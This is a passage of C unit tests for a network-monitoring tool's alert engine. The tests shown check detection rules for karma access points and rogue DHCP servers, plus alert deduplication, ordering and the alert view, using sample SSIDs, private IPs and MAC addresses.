    const char *ssids[] = { "homewifi", "Starbucks", "ACME-Corp" };
    seed_karma_ap(&s, bssid, ssids, 3);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_KARMA_AP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_karma_two_ssids_no_fire(void) {
    /* Threshold is 3 — two SSIDs is benign (some APs do migrate). */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    const char *ssids[] = { "homewifi", "homewifi-guest" };
    seed_karma_ap(&s, bssid, ssids, 2);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_KARMA_AP), -1);
}

static void test_karma_one_ssid_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    uint8_t bssid[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
    const char *ssids[] = { "homewifi" };
    seed_karma_ap(&s, bssid, ssids, 1);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_KARMA_AP), -1);
}

/* ── Rogue DHCP ──────────────────────────────────────────── */

static void add_dhcp_event(sloth_state_t *s, const char *mac,
                            const char *server_ip, uint8_t msg_type) {
    if (s->dhcp_event_count >= MAX_DHCP_EVENTS) return;
    dhcp_event_t *e = &s->dhcp_events[s->dhcp_event_count++];
    memset(e, 0, sizeof(*e));
    snprintf(e->mac,       sizeof(e->mac),       "%s", mac);
    snprintf(e->server_ip, sizeof(e->server_ip), "%s", server_ip);
    e->msg_type  = msg_type;
    e->last_seen = time(NULL);
}

static void test_rogue_dhcp_single_server_no_fire(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "192.168.1.1", 5 /* ACK */);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "192.168.1.1", 5);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_DHCP), -1);
}

static void test_rogue_dhcp_two_servers_fires(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "192.168.1.1",   5);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "192.168.1.234", 5);   /* rogue */
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_DHCP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].sev, (int)ALERT_SEV_CRIT);
}

static void test_rogue_dhcp_client_requests_dont_count(void) {
    /* Client-side messages (DISCOVER / REQUEST) carry no server_ip;
     * those alone must not trigger the rule. */
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "", 1 /* DISCOVER */);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "", 3 /* REQUEST  */);
    alerts_update(&s);
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_DHCP), -1);
}

/* Kills the sort-loop boundary mutations and the key/detail snprintf
 * mutations: detail and key must list servers in stable alphabetical
 * order regardless of observation order. */
static void test_rogue_dhcp_detail_lists_servers_sorted(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    /* Seed in non-alphabetical order to prove the sort runs. */
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "192.168.1.234", 5);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "10.0.0.1",      5);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:03", "172.16.0.1",    5);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_DHCP);
    ASSERT(idx >= 0);
    const char *d = s.alerts[idx].detail;
    /* Count is announced first. */
    ASSERT(strstr(d, "3 distinct DHCP servers") != NULL);
    /* All three IPs present. */
    const char *p1 = strstr(d, "10.0.0.1");
    const char *p2 = strstr(d, "172.16.0.1");
    const char *p3 = strstr(d, "192.168.1.234");
    ASSERT(p1 != NULL); ASSERT(p2 != NULL); ASSERT(p3 != NULL);
    /* Sorted: 10.0.0.1 < 172.16.0.1 < 192.168.1.234 by strcmp. */
    ASSERT(p1 < p2);
    ASSERT(p2 < p3);
    /* Dedup key includes the sorted list (drives stable identity). */
    ASSERT(strstr(s.alerts[idx].key, "10.0.0.1,172.16.0.1,192.168.1.234") != NULL);
}

/* Kills the `67` port-literal mutation: the alert must carry the DHCP
 * server port so per-flow pcap export filters the right service. */
static void test_rogue_dhcp_match_port_is_server_port(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "10.0.0.1",      5);
    add_dhcp_event(&s, "aa:bb:cc:dd:ee:02", "192.168.1.234", 5);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_ROGUE_DHCP);
    ASSERT(idx >= 0);
    ASSERT_EQ((int)s.alerts[idx].match_port, 67);
    /* match_ip is the alphabetically-first server — the operator's pivot. */
    ASSERT_STR(s.alerts[idx].match_ip, "10.0.0.1");
}

/* Kills the dup-detection mutations on line 635 (`dup = 1` → 2/0) and
 * the dup-strcmp comparison: the same server seen many times must
 * count as one server, not many. */
static void test_rogue_dhcp_dedup_same_server(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    for (int i = 0; i < 5; i++)
        add_dhcp_event(&s, "aa:bb:cc:dd:ee:01", "192.168.1.1", 5);
    alerts_update(&s);
    /* Five observations, one server — no rogue. */
    ASSERT_EQ(find_alert(&s, ALERT_TYPE_ROGUE_DHCP), -1);
}

/* ── Dedup ───────────────────────────────────────────────── */

static void test_dedup_increments_count(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    alerts_update(&s);
    int idx = find_alert(&s, ALERT_TYPE_PORT_SCAN);
    ASSERT(idx >= 0);
    int first_count = s.alerts[idx].count;
    ASSERT_EQ(first_count, 1);

    /* same state, fire again */
    alerts_update(&s);
    idx = find_alert(&s, ALERT_TYPE_PORT_SCAN);
    ASSERT(idx >= 0);
    ASSERT_EQ(s.alerts[idx].count, 2);
    /* only one entry (no duplicates) */
    int ps_entries = 0;
    for (int i = 0; i < s.alert_count; i++)
        if (s.alerts[i].type == ALERT_TYPE_PORT_SCAN) ps_entries++;
    ASSERT_EQ(ps_entries, 1);
}

static void test_distinct_keys_create_distinct_alerts(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    add_scan(&s, "10.0.0.55", 12, 1);
    alerts_update(&s);
    int n = 0;
    for (int i = 0; i < s.alert_count; i++)
        if (s.alerts[i].type == ALERT_TYPE_PORT_SCAN) n++;
    ASSERT_EQ(n, 2);
}

/* ── Snapshot ordering ────────────────────────────────────── */

static void test_snapshot_newest_first(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);

    /* First fire an old alert by stuffing the engine via two updates with
       different state. With current API we can't predate first_seen, but
       newer alerts will have a later last_seen. */
    add_scan(&s, "10.0.0.10", 15, 1);
    alerts_update(&s);

    /* sleep cheating: just call update again with a different IP — both will
       have last_seen ~= now, but in the order alerts were created. */
    seed_state(&s);
    add_scan(&s, "10.0.0.20", 20, 1);
    alerts_update(&s);

    /* the most recently fired key should now be at index 0 (newest first) */
    ASSERT(s.alert_count >= 2);
    /* whichever ordering: both have type PORT_SCAN, last_seen >= the other.
       Confirm sorted descending. */
    for (int i = 1; i < s.alert_count; i++)
        ASSERT(s.alerts[i - 1].last_seen >= s.alerts[i].last_seen);
}

/* ── View / key ──────────────────────────────────────────── */

static void test_view_draw_empty(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    view_alerts_draw(&s);
    ASSERT(1);
}

static void test_view_draw_populated(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    add_dns_query(&s, "192.168.1.5", "malware.testing.com");
    add_conn(&s, "192.0.2.66", 443);
    alerts_update(&s);
    ASSERT_GE(s.alert_count, 3);
    view_alerts_draw(&s);
}

static void test_view_key_nav(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    add_scan(&s, "10.0.0.55", 12, 1);
    alerts_update(&s);
    ASSERT_EQ(s.alert_sel, 0);
    view_alerts_key(&s, SLOTH_KEY_DOWN);
    ASSERT_EQ(s.alert_sel, 1);
    view_alerts_key(&s, SLOTH_KEY_UP);
    ASSERT_EQ(s.alert_sel, 0);
}

static void test_view_key_clear(void) {
    alerts_clear();
    sloth_state_t s; seed_state(&s);
    add_scan(&s, "10.0.0.99", 15, 1);
    alerts_update(&s);
    ASSERT_GT(s.alert_count, 0);
    view_alerts_key(&s, 'c');
    ASSERT_EQ(s.alert_count, 0);

    /* underlying engine cleared too — a second update with no triggers
       should leave the count at zero. */
    seed_state(&s);
    alerts_update(&s);
    ASSERT_EQ(s.alert_count, 0);
}

void run_alerts_tests(void) {
    TEST_SUITE("alerts rule firing");
    RUN_TEST(test_port_scan_fires);
    RUN_TEST(test_port_scan_not_flagged_no_fire);
    RUN_TEST(test_deauth_flood_fires);
    RUN_TEST(test_deauth_flood_detail_content);
    RUN_TEST(test_nxdomain_burst_fires_at_threshold);
    RUN_TEST(test_nxdomain_below_threshold_no_fire);
    RUN_TEST(test_nxdomain_outside_window_no_fire);
    RUN_TEST(test_threat_domain_fires_on_ioc);
    RUN_TEST(test_threat_domain_clean_no_fire);
    RUN_TEST(test_threat_ip_fires);
    RUN_TEST(test_arp_spoof_no_alert_on_first_obs);
    RUN_TEST(test_arp_spoof_fires_on_mac_change);
    RUN_TEST(test_arp_spoof_silent_on_same_mac);
    RUN_TEST(test_arp_spoof_skips_multicast_mac);
    RUN_TEST(test_arp_spoof_skips_all_zero_mac);
    RUN_TEST(test_arp_spoof_detail_contains_both_macs);
    RUN_TEST(test_arp_spoof_history_overflow_safe);
    RUN_TEST(test_rogue_dhcp_single_server_no_fire);
    RUN_TEST(test_rogue_dhcp_two_servers_fires);
    RUN_TEST(test_rogue_dhcp_client_requests_dont_count);
    RUN_TEST(test_rogue_dhcp_detail_lists_servers_sorted);
    RUN_TEST(test_rogue_dhcp_match_port_is_server_port);
    RUN_TEST(test_rogue_dhcp_dedup_same_server);
    RUN_TEST(test_evil_twin_open_plus_wpa2_fires);
    RUN_TEST(test_evil_twin_two_wpa2_no_fire);
    RUN_TEST(test_evil_twin_two_open_no_fire);
    RUN_TEST(test_evil_twin_different_ssids_no_fire);
    RUN_TEST(test_evil_twin_detail_contains_bssids_and_ssid);
    RUN_TEST(test_karma_three_ssids_fires);
    RUN_TEST(test_karma_two_ssids_no_fire);
    RUN_TEST(test_karma_one_ssid_no_fire);
    RUN_TEST(test_dns_tunnel_fires_on_long_subdomain_burst);
    RUN_TEST(test_dns_tunnel_normal_traffic_no_fire);
    RUN_TEST(test_dns_tunnel_few_long_no_fire);
    RUN_TEST(test_probe_flood_fires_on_high_rate);
    RUN_TEST(test_probe_flood_low_total_no_fire);
    RUN_TEST(test_probe_flood_exactly_at_frame_threshold_fires);
    RUN_TEST(test_probe_flood_one_below_frame_threshold_no_fire);
    RUN_TEST(test_probe_flood_detail_contains_mac);
    RUN_TEST(test_probe_flood_too_brief_no_fire);
    RUN_TEST(test_attack_tool_ua_sqlmap_fires);
    RUN_TEST(test_attack_tool_ua_nmap_case_insensitive);
    RUN_TEST(test_attack_tool_ua_normal_browser_no_fire);
    RUN_TEST(test_attack_path_traversal_fires);
    RUN_TEST(test_attack_path_sqli_fires);
    RUN_TEST(test_attack_path_log4shell_fires);
    RUN_TEST(test_attack_path_xss_fires);
    RUN_TEST(test_attack_path_normal_no_fire);
    RUN_TEST(test_weak_tls_tls10_fires);
    RUN_TEST(test_weak_tls_sslv3_fires);
    RUN_TEST(test_weak_tls_tls13_no_fire);
    RUN_TEST(test_weak_tls_tls12_no_fire);

    TEST_SUITE("alerts dedup");
    RUN_TEST(test_dedup_increments_count);
    RUN_TEST(test_distinct_keys_create_distinct_alerts);

    TEST_SUITE("alerts snapshot");
    RUN_TEST(test_snapshot_newest_first);

    TEST_SUITE("view_alerts");
    RUN_TEST(test_view_draw_empty);
    RUN_TEST(test_view_draw_populated);
    RUN_TEST(test_view_key_nav);
    RUN_TEST(test_view_key_clear);
}
